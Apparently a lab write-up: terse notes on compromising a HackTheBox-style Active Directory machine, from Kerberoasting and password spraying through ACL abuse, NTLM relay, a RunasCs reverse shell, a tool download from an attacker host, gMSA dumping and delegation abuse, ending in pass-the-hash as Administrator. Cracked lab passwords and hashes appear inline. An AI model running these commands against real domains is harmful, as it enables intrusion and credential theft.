Basically it comes to this

1. Find all valid users on the domain  --rid-brute 10000 of cme smb

2. Use the user that does not have kerberos pre-auth set to check for SPNs against the user list.  with the impacket spn nopreauth branch ! in .env!

3. Crack the TGS of the ldap_monitor (hashcat mode 13100 is for TGS...)  `1GR8t@$$4u`



4. Check which other user may use the same password   Password Spray! and `oorend has 1GR8t@$$4u`

5. Check the ACLs for this particular user 

6. Find a way to get to the ServiceMgmt group

7. Abuse the permission that this group has to be able to connect to the DC via winrm 




bloodyAD -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.10.11.231 add groupMember SERVICEMGMT oorend

python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend

python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'Coder123$'



and with winrm we can login as winrm_svc service 


now nc.exe spawing shell for stability



sharphound.exe -c all 


winrm_svc --> (CanPsRemote)  tbrady --> (ReadGMSAPassword) Delegator$ --> (by Enterprise Admins) Administrator 




create 



`https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained`


SPN is not allowed to delegate by user ldap_monitor or initial TGT not forwardable


i can still tbrady hash 

`query user  tbrady activate console`

```
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 && 
sudo python3 ~/Tools/impacket/examples/ntlmrelayx.py -t ldap://10.10.11.231 --no-wcf-server --escalate-user winrm_svc
```

.\RemotePotato0.exe -m 2 -r 10.10.x.x -x 10.10.x.x -p 9999 -s 1


find tbrady hash




john crack hash


543BOMBOMBUNmanda


.\RunasCs.exe tbrady 543BOMBOMBUNmanda cmd.exe -r IP:PORT



`powershell -exec bypass -c "iwr http://10.10.16.4:7777/GMSAPasswordReader.exe -outfile gmsa.exe"`


gmsadumper --> impacket 

```
faketime -f +7h python3 ~/Tools/impacket/examples/getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes :9b0ccb7d34c670b2a9c81c45bc8befc3

export KRB5CCNAME=./delegator\$@dc01.rebound.htb.ccache



bloodyAD -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword
faketime -f +7h impacket-getTGT 'rebound.htb/delegator$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3 -dc-ip 10.10.11.231

export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache


impacket-rbcd 'rebound.htb/delegator$' -k -no-pass -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip $IP -debug 



rubeus --> all hashes

impacket-wmiexec -hashes :176be138594933bb67db3b2572fc91b8 rebound.htb/administrator@dc01.rebound.htb





```







